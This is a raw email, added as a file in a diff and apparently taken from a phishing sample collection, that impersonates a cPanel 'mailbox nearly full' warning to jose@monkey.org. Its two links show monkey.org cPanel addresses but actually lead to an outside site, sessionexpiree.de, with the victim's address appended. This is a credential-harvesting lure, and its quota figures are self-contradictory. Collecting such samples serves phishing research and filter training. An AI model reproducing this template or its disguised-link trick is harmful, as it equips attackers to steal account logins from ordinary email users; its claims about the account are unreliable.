@@ -1,0 +1,143 @@
+Return-Path: cp@amao-wama-mac.org
+Delivered-To: jose@monkey.org
+X-FDA: 83310299478.20.3FA4673
+Received: from gallant-sinoussi.147-45-221-198.plesk.page (unknown [147.45.221.198])
+	by imf06.b.hostedemail.com (Postfix) with ESMTP id C7FC4C0002
+	for <jose@monkey.org>; Tue,  8 Apr 2025 09:07:57 +0000 (UTC)
+Authentication-Results: imf06.b.hostedemail.com;
+	dkim=fail ("headers rsa verify failed") header.d=amao-wama-mac.org header.s=default header.b=Cn485ah0;
+	spf=pass (imf06.b.hostedemail.com: domain of cp@amao-wama-mac.org designates 147.45.221.198 as permitted sender) smtp.mailfrom=cp@amao-wama-mac.org;
+	dmarc=pass (policy=quarantine) header.from=amao-wama-mac.org
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1744103278;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=Ro/lcqaui4+mnjGwl17TtC54cuN8dkves+m5Czv9RbM=;
+	b=WzjKdgZHN1SkG1s8mpsJv+WF8HZbIl8YZ1anA4TLKXTQoTn+d7nZ2Acz3Rz58on01OLXMS
+	Po9VpfPJbucx2hcAwSDbekymaLNVklKQxExLWH+hmmHKSqhQbGfMyyne97R6DPwvCshgLF
+	4et7A1CrHyE3WsYBxGouSco0ATl1k7o=
+ARC-Authentication-Results: i=1;
+	imf06.b.hostedemail.com;
+	dkim=fail ("headers rsa verify failed") header.d=amao-wama-mac.org header.s=default header.b=Cn485ah0;
+	spf=pass (imf06.b.hostedemail.com: domain of cp@amao-wama-mac.org designates 147.45.221.198 as permitted sender) smtp.mailfrom=cp@amao-wama-mac.org;
+	dmarc=pass (policy=quarantine) header.from=amao-wama-mac.org
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1744103278; a=rsa-sha256;
+	cv=none;
+	b=cuqSXEWMirg8jgYjReWQ9+XYoUi5NvdmeGodcurNUGiUtdhZ14p4qFGre/gh/rK6sAWf0D
+	iOy5mjtdKbFhgpWevKEW7k0X5ryijxqxcjt0A/+tJ8hQTxUrCYO+kfAAOR4lTvBcril070
+	NFbXGWfDg51PkZ7uuXWp90ez/TrYyYw=
+Received: from amao-wama-mac.org (unknown [74.234.24.187])
+	by gallant-sinoussi.147-45-221-198.plesk.page (Postfix) with ESMTPSA id 3C3429473D
+	for <jose@monkey.org>; Tue,  8 Apr 2025 09:55:27 +0200 (CEST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=amao-wama-mac.org;
+	s=default; t=1744098927;
+	bh=Ro/lcqaui4+mnjGwl17TtC54cuN8dkves+m5Czv9RbM=; h=From:To:Subject;
+	b=Cn485ah0+yoKAL3yWnql6tICvUYPYWh4TwSGLn7xXO3Ym2MOfAZU1FMd5b4ALMfpo
+	 Twa12OfcJv2XEg7Ho7Edmcs2hfGI67bMgmISPYsUnZQtksg+mlten2cORn+IKsh7Ad
+	 Q62EBAwY8YGVK17f0MJbl9NPVWfycWkfVhlA/44eYeEJFboBQxStaSw5GiGg1ecmMq
+	 hNmcw9MGrLVSN0qksQvnOZbctEn/moQuDEzw000HfP4SAHuwin4N+Y/QULyQWHlXQk
+	 pnNM024VlbAKBGyVILb28ubsvYPCbsUXOyhR2q+LULbiltnlk9hLDCDErNzQpU/9hp
+	 1g08pCZ/yzsmw==
+Received-SPF: pass (gallant-sinoussi.147-45-221-198.plesk.page: connection is authenticated)
+From: cPanel on monkey.org  <cp@amao-wama-mac.org>
+To: jose@monkey.org
+Subject: [ monkey.org =?UTF-8?B?XSBXQVJOSU5HOiBUaGUg4oCc?=jose@monkey.org=?UTF-8?B?4oCdIGVtYWlsIGFjY291bnQgaXMgbmVhcmx5IGZ1bGwu?=
+Date: 08 Apr 2025 07:55:27 +0000
+Message-ID: <20250408075527.B172C151C7E68552@amao-wama-mac.org>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspam-User: 
+X-Rspamd-Server: rspam06
+X-Rspamd-Queue-Id: C7FC4C0002
+X-Spam-Status: No, score=3.99
+X-Stat-Signature: x7fgttpmj7s9gqqr9tyxn7x6zq466xht
+X-HE-Tag: 1744103277-930412
+X-HE-Meta: U2FsdGVkX19hn52iuSZmb5v+5vmo4zyzglRV1eyi4EhnjdtgZwOuWLkjuCtkIqscM5TMYc+rkoOkLPo25ACZsfKLrTYFA2q/bMFo4ODfsbYbp0J68jJLWGydr9u+Nyt+OAal2L2dG5G6qIufYomHBSFLpP5oebVettbsO1rXYwcvayRVakLgcdYSRwYykpDB2jg+OlCzqQpbk1+LwsvGpsu8P1G9W619g0MDYVaq5dkVn1V9EySp/+mOAOO54v6uNd+rwj9K6sNCMMbGGUBLuJ72gWfXMJmSqZakP6sUNjTU0Gij2U0qs7NltOR3bBKlhfk6q/WljFvqSmzjcM364iV0zimf2gL2ItCLl1kfLRldndPC1Md1vQ9EZjg4hTLmSjB+mg8yKBhR4afmiOSBuphW90NaSVLHpdzJzVB8cgxqhLK4Fmrq9ThIVUQ5opqnoa/pJUsj3kgNyml8QiaqxhOh0IBzrKOQb8bRMmr7BDifEhTFRSNCPp/kEU2SCPi7yXzdeGXxB/lIleis4XQ/9uHfP4S29qPuatKsCMUJykHQPfKxqHzoZs79rrCcn18oFczwFb2kO01zSq77kbE2jYw9zM6a5fEOpTEzzkuWwTRnVSpRvjPDMpvG+178Uq73Er8EsTxx3ksltPL/1snBddPIp+o92klUnZPaqjSq1F0TRssDBVn97+WIVRQHSgqwDzbYqxu9n79wJGK+cERUv4gcir2kqh7tUFMClUi2M+zzbRlqbbem56/vNSuxZD8XbEWauoueUSkTBYZfxmDxCH8fQ79Yw2FvmMnE18FYPqXM47LSdMzXdKc13Vy86u/oxn0ECbVzuO3R56lIPJeumgk1mHeEEz2SwmY8Bd0+0W23MPZ0NBcSpqj5y4zQnO6j7hV25BswgnsaoLO2x5x6s1amtWHjLYDZm57gi9Q+hIG9HA+2ZGiHEo6CvRriKPq681yRqdVpPS/iu5lB2b70hJdW3+v
+ NqOEO+fA8v9BbdMcThbI/o/jb1QieXXhLtQNnXqvTYsE7Z40MQVByUm2gp0+lGw2B7RJ3KqV+MfGNJqrFpMKrgHIJELSeSeeLfe9/SJ9OI4ERHDiukE72FYqRWoIpAyfElzu7ZUIrJUI2BFoWFLCEicSpiFOYsVwSERo5jIB62iy6oCnntSRY77tGmd6uOd6dJYzfCRBwBvuqCWkTQZH/eUF5PvrLrngZAV9BKr13mWqVvHjRlk1PL8tVkxDYSZXe7uZCXT9whKk1TKj2oJhqkgzZMHMDeCG6XrCd0nDcwx403/Aq8xx/jPzpF0JJd7gkkAuH/YaAIIeiw7Had82z0jyao/diC3fl5YCh1xM+ua7gmyOJPjSsU08g137LI9W/2uMHDJjXuboB9eG1ZL1tbydcK0m7IcGoh4p5UqGvsFlY1ln1NT5e/fDwT+YHmlbw2xls8or+aDGIfZJYB1MxJZSwjsYLY6jf5RcwI0KDeY5tULb7AG4PTXJ8hV6/d/G2c5WP0RB0X3D8PjXXy/cTjNiPFb7CIo15q6dGN5RvRRECjE2IgKpgNealvd4K+qQ55JY9lRpEnC5KK/FrxCX1tgGXBRfi8oNsvyK9
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 140
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<table width=3D"680" style=3D"border: 0px currentColor; border-image: none;=
+ color: rgb(44, 54, 58); text-transform: none; letter-spacing: normal; font=
+-family: Roboto, sans-serif; font-size: 14px; font-style: normal; font-weig=
+ht: 400; word-spacing: 0px; white-space: normal; border-collapse: collapse;=
+ max-width: 680px; box-sizing: border-box; orphans: 2; widows: 2; backgroun=
+d-color: rgb(244, 244, 244); text-decoration-style: initial; text-decoratio=
+n-color: initial; font-variant-ligatures: normal;=20
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+thickness: initial;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbod=
+y style=3D"box-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><=
+td width=3D"680" height=3D"25" style=3D"color: rgb(51, 51, 51); font-family=
+: &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 16px=
+; box-sizing: border-box;">Mailbox quota notification for "jose@monkey.org"=
+=2E</td></tr><tr style=3D"box-sizing: border-box;">
+<td style=3D"border-width: 2px; border-style: solid; border-color: rgb(232,=
+ 232, 232) rgb(232, 232, 232) rgb(255, 108, 44); padding: 15px 0px 20px; bo=
+x-sizing: border-box; background-color: rgb(255, 255, 255);"><table width=
+=3D"680" style=3D"background: rgb(255, 255, 255); font-family: &quot;Helvet=
+ica Neue&quot;, Helvetica, Arial, sans-serif; border-collapse: collapse; bo=
+x-sizing: border-box;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tb=
+ody style=3D"box-sizing: border-box;"><tr style=3D"box-sizing: border-box;"=
+>
+<td width=3D"15" style=3D"box-sizing: border-box;"></td><td width=3D"650" s=
+tyle=3D"box-sizing: border-box;"><table width=3D"100%" style=3D"border-coll=
+apse: collapse; box-sizing: border-box;" border=3D"0" cellspacing=3D"0" cel=
+lpadding=3D"0"><tbody style=3D"box-sizing: border-box;"><tr style=3D"box-si=
+zing: border-box;"><td style=3D"box-sizing: border-box;"><p style=3D"margin=
+-top: 0px; margin-bottom: 1rem; box-sizing: border-box;"><strong><font colo=
+r=3D"#e81f17">The "jose@monkey.org" email account is nearly full.</font></s=
+trong>
+</p>
+<p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">=
+The email account currently uses 98.92% (959.11&nbsp;MB/500&nbsp;MB) of its=
+ capacity.</p><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing:=
+ border-box;">You should remove some emails from the mailbox as soon as pos=
+sible in order to prevent the loss of any future email. Use the Email Disk =
+Usage tool at<span>&nbsp;</span>
+<a style=3D"color: rgb(0, 172, 255); text-decoration: none; box-sizing: bor=
+der-box; background-color: transparent;" href=3D"https://sessionexpiree.de/=
+cpa/checksec.html#jose@monkey.org" target=3D"_blank" rel=3D"noreferrer">htt=
+ps://monkey.org:2096/?goto_app=3DEmail_DiskUsage</a>, or ask the system adm=
+inistrator to upgrade your account to a larger quota.</p></td></tr><tr styl=
+e=3D"box-sizing: border-box;"><td style=3D"box-sizing: border-box;">
+<div style=3D'color: rgb(102, 102, 102); padding-top: 5px; font-family: "He=
+lvetica Neue", Helvetica, Arial, sans-serif; font-size: 12px; margin-top: 5=
+px; border-top-color: rgb(232, 232, 232); border-top-width: 2px; border-top=
+-style: solid; box-sizing: border-box;'><p style=3D"margin: 5px 0px 0px; pa=
+dding: 0px; box-sizing: border-box;">The system generated this notice on 4/=
+8/2025 7:55:27 a.m.</p></div>
+<p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">=
+
+You can disable the "Quota::MailboxWarning" type of notification through th=
+e cPanel interface:<span>&nbsp;</span><a style=3D"color: rgb(0, 172, 255); =
+text-decoration: none; box-sizing: border-box; background-color: transparen=
+t;" href=3D"https://sessionexpiree.de/cpa/checksec.html#jose@monkey.org" ta=
+rget=3D"_blank" rel=3D"noreferrer">https://monkey.org:2083/?goto_app=3DCont=
+actInfo_Change</a></p>
+<p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">=
+
+Do not reply to this automated message.</p></td></tr></tbody></table></td><=
+td width=3D"15" style=3D"box-sizing: border-box;"></td></tr></tbody></table=
+></td></tr><tr style=3D"box-sizing: border-box;"><td align=3D"center" style=
+=3D"padding-top: 10px; box-sizing: border-box;">
+
+<p style=3D'margin: 0px; padding: 0px; color: rgb(102, 102, 102); font-fami=
+ly: "Helvetica Neue", Helvetica, Arial, sans-serif; font-size: 12px; box-si=
+zing: border-box;'>Copyright&copy;&nbsp;2025 cPanel, L.L.C.</p></td></tr></=
+tbody></table><p>
+</p>
+
+
+</body></html>
